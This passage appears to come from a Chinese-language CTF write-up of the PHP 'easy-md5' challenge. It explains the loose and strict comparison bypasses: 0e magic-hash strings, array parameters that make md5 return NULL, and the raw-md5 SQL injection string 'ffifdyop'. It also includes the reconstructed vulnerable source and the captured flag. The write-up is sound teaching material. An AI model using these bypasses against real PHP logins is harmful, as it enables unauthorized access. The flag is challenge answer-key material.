-<p><strong>两条路都能过：</strong></p>
-<p><strong>① 0e 碰撞</strong></p>
-<p><strong>两个不同的字符串，MD5 后都以 <code>0e</code> 开头且后面全是数字 → 被当成科学计数法比较 → 都等于 0。</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>QNKCDZO      → 0e830400451993494058024219903391
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>240610708    → 0e462097431906509019562988736854
-</span></code></pre></div>
-<p><strong>② 数组</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>?a[]=1&amp;b[]=2
-</span></code></pre></div>
-<p><strong><code>md5(array)</code> 在 PHP 7 里报个 warning 然后返回 NULL —— 两边都是 NULL，<code>NULL == NULL</code> 成立。</strong></p>
-<h4 id="step-5"><a class="toclink" href="easy-md5/#step-5">Step 5：第三关 —— 严格不等 + 强相等</a></h4>
-<p><img alt="第三关源码" src="../assets/images/easy-md5/04-level3-source.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="x">if ($_POST['param1'] !== $_POST['param2'] &amp;&amp; md5($_POST['param1']) === md5($_POST['param2'])) {</span>
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="x">    echo $flag;</span>
-</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="x">}</span>
-</span></code></pre></div>
-<p><strong><code>!==</code> 和 <code>===</code> 都不做类型转换 —— 这才是关键。</strong></p>
-<p><strong>0e 那条路断了：字符串 <code>===</code> 比较要求完全相同。</strong></p>
-<p><strong>但数组还能用：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>param1[]=1&amp;param2[]=2
-</span></code></pre></div>
-<table>
-<thead>
-<tr>
-<th>表达式</th>
-<th>结果</th>
-<th>原因</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>param1 !== param2</code></td>
-<td><strong>true</strong></td>
-<td>两个数组元素不同</td>
-</tr>
-<tr>
-<td><code>md5(param1) === md5(param2)</code></td>
-<td><strong>true</strong></td>
-<td>两边都是 NULL，<code>NULL === NULL</code></td>
-</tr>
-</tbody>
-</table>
-<p><strong>注意：<code>md5(array)</code> 在 <strong>PHP 8</strong> 会直接抛 <code>TypeError</code>（致命错误）—— 这招只在 PHP 7 上成立。</strong></p>
-<h4 id="step-6-flag"><a class="toclink" href="easy-md5/#step-6-flag">Step 6：拿 flag</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>CTF2{028c2bd1-33f7-401b-b299-1525fd86cf41}
-</span></code></pre></div>
-<hr />
-<h3 id="_3"><a class="toclink" href="easy-md5/#_3">解题思路总结</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>页面只有一个查询框 → 试 SQL 注入没反应 → 抓包看响应头
-</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>  → Hint: password=md5($pass, true)
-</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>    → md5 第二参数 true 返回 16 字节原始二进制
-</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>      → 原始字节可含引号 → SQL 注入
-</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>        → ffifdyop 的原始 md5 以 'or'6 开头 → 永真 → 第一关过
-</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>          → 第二关：!= 和 == → 0e 碰撞 或 数组
-</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>            → 第三关：!== 和 === → 只能数组
-</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>              → flag
-</span></code></pre></div>
-<h4 id="_4"><a class="toclink" href="easy-md5/#_4">漏洞原理</a></h4>
-<p><strong>三关考的都是"比较时发生了什么"，但三种比较的严格程度不同：</strong></p>
-<table>
-<thead>
-<tr>
-<th>写法</th>
-<th>含义</th>
-<th>能被什么打败</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>!=</code> / <code>==</code></td>
-<td>松散比较，<strong>先转类型再比</strong></td>
-<td>类型转换（<code>0e</code> 科学计数法、<code>'1' == 1</code>）</td>
-</tr>
-<tr>
-<td><code>!==</code> / <code>===</code></td>
-<td>严格比较，<strong>类型和值都要一样</strong></td>
-<td>类型本身被改变（数组 → <code>md5</code> 返回 NULL）</td>
-</tr>
-<tr>
-<td><code>md5($x, true)</code></td>
-<td>返回<strong>原始字节</strong>而非十六进制</td>
-<td>原始字节里可以长成 SQL 语法的一部分</td>
-</tr>
-</tbody>
-</table>
-<p><strong>一句话：</strong><code>==</code> 骗的是"值"，<code>===</code> 骗不了值 —— 但可以骗"类型"。**</p>
-<h4 id="_5"><a class="toclink" href="easy-md5/#_5">关键知识点</a></h4>
-<table>
-<thead>
-<tr>
-<th>知识点</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>md5($s, true)</code></td>
-<td>返回 16 字节原始二进制（可含 <code>'</code> <code>\</code> 等字符）</td>
-</tr>
-<tr>
-<td><code>ffifdyop</code></td>
-<td>它的原始 MD5 以 <code>'or'6</code> 开头，是万能密码的经典 payload</td>
-</tr>
-<tr>
-<td>0e 碰撞</td>
-<td><code>QNKCDZO</code> / <code>240610708</code> / <code>aabg7XSs</code> 等，MD5 都是 <code>0e</code> 开头纯数字</td>
-</tr>
-<tr>
-<td><code>md5(array)</code></td>
-<td><strong>PHP 7</strong>：warning + 返回 NULL；<strong>PHP 8</strong>：<code>TypeError</code></td>
-</tr>
-<tr>
-<td>NULL 比较</td>
-<td><code>NULL == NULL</code> 真，<code>NULL === NULL</code> 也真</td>
-</tr>
-<tr>
-<td>Hint 藏响应头</td>
-<td>页面没反应不代表没线索，<strong>抓包看头</strong></td>
-</tr>
-<tr>
-<td>松散 vs 严格</td>
-<td><code>==</code> 转类型；<code>===</code> 不转（但类型可以被函数返回值改变）</td>
-</tr>
-</tbody>
-</table>
-<hr />
-<details class="note">
-<summary>三关源码（按截图整理）</summary>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="x">&lt;!-- 第一关：在响应头里给 Hint --&gt;</span>
-</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="x">&lt;!--</span>
-</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="x">Hint: select * from 'admin' where password=md5($pass, true)</span>
-</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="x">--&gt;</span>
-</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>
-</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="x">&lt;!-- 第二关 --&gt;</span>
-</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="cp">&lt;?php</span>
-</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'a'</span><span class="p">];</span>
-</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a><span class="nv">$b</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'b'</span><span class="p">];</span>
-</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="k">if</span> <span class="p">(</span><span class="nv">$a</span> <span class="o">!=</span> <span class="nv">$b</span> <span class="o">&amp;&amp;</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span> <span class="o">==</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$b</span><span class="p">))</span> <span class="p">{</span>
-</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a>    <span class="c1">// wow, glzjin wants a girl friend.</span>
-</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a><span class="p">}</span>
-</span><span id="__span-13-13"><a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a><span class="cp">?&gt;</span>
-</span><span id="__span-13-14"><a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a>
-</span><span id="__span-13-15"><a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a><span class="x">&lt;!-- 第三关 --&gt;</span>
-</span><span id="__span-13-16"><a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a><span class="cp">&lt;?php</span>
-</span><span id="__span-13-17"><a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-</span><span id="__span-13-18"><a id="__codelineno-13-18" name="__codelineno-13-18" href="#__codelineno-13-18"></a><span class="k">include</span> <span class="s2">"flag.php"</span><span class="p">;</span>
-</span><span id="__span-13-19"><a id="__codelineno-13-19" name="__codelineno-13-19" href="#__codelineno-13-19"></a><span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-</span><span id="__span-13-20"><a id="__codelineno-13-20" name="__codelineno-13-20" href="#__codelineno-13-20"></a><span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'param1'</span><span class="p">]</span> <span class="o">!==</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'param2'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'param1'</span><span class="p">])</span> <span class="o">===</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'param2'</span><span class="p">]))</span> <span class="p">{</span>
-</span><span id="__span-13-21"><a id="__codelineno-13-21" name="__codelineno-13-21" href="#__codelineno-13-21"></a>    <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
-</span><span id="__span-13-22"><a id="__codelineno-13-22" name="__codelineno-13-22" href="#__codelineno-13-22"></a><span class="p">}</span>
-</span><span id="__span-13-23"><a id="__codelineno-13-23" name="__codelineno-13-23" href="#__codelineno-13-23"></a><span class="cp">?&gt;</span>
 </span></code></pre></div>
 </details>
     
